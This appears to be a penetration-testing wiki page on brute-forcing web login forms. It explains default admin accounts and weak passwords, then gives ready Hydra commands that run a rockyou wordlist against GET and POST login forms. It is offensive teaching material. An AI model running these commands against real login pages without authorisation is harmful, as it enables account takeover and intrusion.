# Brute-Force

## Theory

We may attempt to brute-force a web service as we may not be abe to fully interact with it without credentials. Most web services come with a default user account such as **admin** and may use [common, default, weak or leaked passwords](../../../redteam/delivery/passwd/default-weak-and-leaked-passwords.md). For our brute-force attack, it will dramatically increase our chances of success and reduce the expected duration of our attack.

## Practice

{% tabs %}
{% tab title="Hydra" %}
We can use Hydra to perform such attack on HTTP/HTTPS forms. We might use following methods:

* http-get-form, in case of an http page with a get form
* https-get-form, in case of an https page with a get form
* http-post-form, in case of an http page with a post form
* https-post-form, in case of an https page with a post form

```bash
# -l : username
# -P : password list
# http(s)-*-form : "<Path_To_Login_Form>:<Post_Data>:<Incorrect_String>
# Find on error
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login.php:user=^USER^&password=^PASS^:Login failed"

# Find on success
# http(s)-*-form : "<Path_To_Login_Form>:<Post_Data>:S=<Success_String>
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> https-post-form "/login.php:user=^USER^&password=^PASS^:S=302"
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-get-form "/login.php:user=^USER^&password=^PASS^:S=Success!"
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://owasp.org/www-community/attacks/Brute_force_attack" %}

{% embed url="https://github.com/gnebbia/hydra_notes" %}
